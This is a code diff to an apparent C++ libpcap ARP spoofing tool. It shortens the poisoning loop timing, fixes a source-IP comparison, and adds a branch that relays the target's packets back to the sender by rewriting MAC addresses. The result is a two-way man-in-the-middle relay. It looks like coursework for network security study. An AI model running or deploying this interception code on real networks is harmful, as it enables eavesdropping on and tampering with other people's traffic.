@@ -144,7 +144,7 @@ void infect_arp(char *dev, char *sender_ip, char *target_ip, std::string sender_
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
 		else{
-			std::this_thread::sleep_for(std::chrono::milliseconds(200));
+			std::this_thread::sleep_for(std::chrono::milliseconds(500));
 			//Infecting period -> 0.2 sec
 		}
 
@@ -185,7 +185,7 @@ void receive_ip_and_relay(char *dev, char *sender_ip, char *target_ip, std::stri
 			IpHdr *ip = (IpHdr*)(packet + sizeof(EthHdr));
 			std::string p_source_ip = std::string(ip->sip());
 
-			if(p_source_ip.compare(sender_ip)){
+			if(p_source_ip.compare(sender_ip) == 0){
 				//Second, check whether the IP is from sender.
 				printf("\nSuccessfully received sender's IP!\n");
 
@@ -198,10 +198,27 @@ void receive_ip_and_relay(char *dev, char *sender_ip, char *target_ip, std::stri
 					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 				}
 				else{
-					printf("\nSuccessfully relay sender's IP!\n");
+					printf("Successfully relay sender's IP!\n");
 			    }
 
 			}//End of 2nd "if"
+			else if(p_source_ip.compare(target_ip) == 0){
+				//Third, check whether the IP is from target.
+				printf("\nSuccessfully received target's IP!\n");
+
+		        ethernet->smac_ = Mac(s_mac);
+				ethernet->dmac_ = Mac(sender_mac);
+
+				res = pcap_sendpacket(handle, packet, header->caplen);
+				
+				if (res != 0) {
+					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+				}
+				else{
+					printf("Successfully relay target's IP!\n");
+			    }
+
+			}//End of "else if"
 			else{
 				continue;
 			}
